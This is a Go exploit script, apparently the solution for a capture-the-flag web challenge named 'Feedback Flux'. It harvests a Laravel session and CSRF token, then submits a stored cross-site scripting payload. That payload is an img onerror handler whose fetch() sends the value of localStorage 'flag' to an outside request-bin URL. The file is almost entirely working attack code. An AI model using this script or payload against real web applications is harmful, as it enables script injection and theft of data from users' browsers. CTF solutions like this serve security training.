package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
)

func main() {
	target_url := flag.String("target_url", "", "Target url for Feedback Flux")
	bin_url := flag.String("bin_url", "", "Bin URL to POST flag to")

	flag.Parse()


	if *target_url == "" {
		log.Println("Error: No target URL provided")
		flag.PrintDefaults()
		os.Exit(1)
	}

	if *bin_url == "" {
		log.Println("Error: No bin URL provided")
		flag.PrintDefaults()
		os.Exit(1)
	}

	fmt.Printf("Preparing exploit on %s, with flag extracting CSRF request to %s\n", *target_url, *bin_url)

	fmt.Printf("Obtaining session from %s\n", *target_url)

	resp, err := http.Get(*target_url)
	if err != nil {
		log.Fatalf("Error: Failed to make request: %v", err)
	}
	defer resp.Body.Close()

	var xsrf_token_cookie string
	var laravel_session_cookie string

	for _, cookie := range resp.Cookies() {
		if cookie.Name == "XSRF-TOKEN" {
			xsrf_token_cookie = cookie.Value
		}
		if cookie.Name == "laravel_session" {
			laravel_session_cookie = cookie.Value
		}
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("Error: Failed to read response body: %v", err)
	}

	re := regexp.MustCompile(`name="_token" value="([^"]+)"`)
	matches := re.FindStringSubmatch(string(body))
	token := matches[1] 

	fmt.Println("Session obtained, successfully - will try to send payload now")

	payload := fmt.Sprintf("<?xml >s<img src=x onerror=\"fetch('%s', {method:'POST', body:localStorage.getItem('flag')})\"> ?>", *bin_url)

	fmt.Printf("Payload is '%s'\n", payload)

	formData := url.Values{}
	formData.Set("_token", token)
	formData.Set("feedback", payload)

	encodedData := formData.Encode()

	req, err := http.NewRequest("POST", *target_url, strings.NewReader(encodedData))
	if err != nil {
		panic(err)
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.AddCookie(&http.Cookie{Name: "XSRF-TOKEN", Value: xsrf_token_cookie})
	req.AddCookie(&http.Cookie{Name: "laravel_session", Value: laravel_session_cookie})

	fmt.Printf("Sending payload to %s\n", *target_url)

	client := &http.Client{}
	resp, err = client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	body, err = io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	
	if resp.Status == "200 OK" {
		fmt.Println("Paylaod sent successfully - please check request bin for challenge flag")	
	} else {
		panic("Did not receive 200 OK response, something went wrong while sending the payload")
	}

}
